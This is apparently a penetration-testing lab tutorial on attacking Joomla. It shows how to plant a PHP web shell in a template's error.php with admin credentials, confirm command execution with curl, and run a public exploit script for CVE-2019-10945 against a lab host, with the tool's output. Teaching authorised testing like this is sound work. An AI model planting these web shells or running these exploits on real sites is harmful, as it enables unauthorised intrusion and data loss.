During the Joomla enumeration phase and the general research hunting for company data, we may come across leaked credentials that we can use for our purposes. We can also use brute forcing. With admin credentials we can add a snippet of PHP code to gain RCE. We can do this by customizing a template:
![[joomla_admin.webp]]

From here, we can click on `Templates` on the bottom left under `Configuration` to pull up the templates menu:
![[joomla_templates.webp]]

Next, we can click on a template name. Let's choose `protostar` under the `Template` column header. This will bring us to the `Templates: Customise` page:
![[joomla_customise.webp]]

Finally, we can click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.

Let's choose the `error.php` page. We'll add a PHP one-liner to gain code execution as follows:
```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

![[joomla_edited.webp]]

Once this is in, click on `Save & Close` at the top and confirm code execution using `cURL`:
```shell-session
$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Leveraging Known Vulnerabilities

At the time of writing, there have been [426](https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html) Joomla-related vulnerabilities that received CVEs. However, just because a vulnerability was disclosed and received a CVE does not mean that it is exploitable or a working public PoC exploit is available. Like with WordPress, critical vulnerabilities (such as those remote code execution) that affect Joomla core are rare. Searching a site such as `exploit-db` shows over 1,400 entries for Joomla, with the vast majority being for Joomla extensions.

It's possible to run into Joomla outdated version with a public vulnerability.

For example Joomla version `3.9.4` is vulnerable to [CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945), which can be use to access or delete files. It's only useful if the admin login portal is not accessible from the outside since, armed with admin creds, we can gain remote code execution, as we saw above:
```shell-session
$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
# Web Site: Haboob.sa
# Email: research@haboob.sa
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       


administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt
```

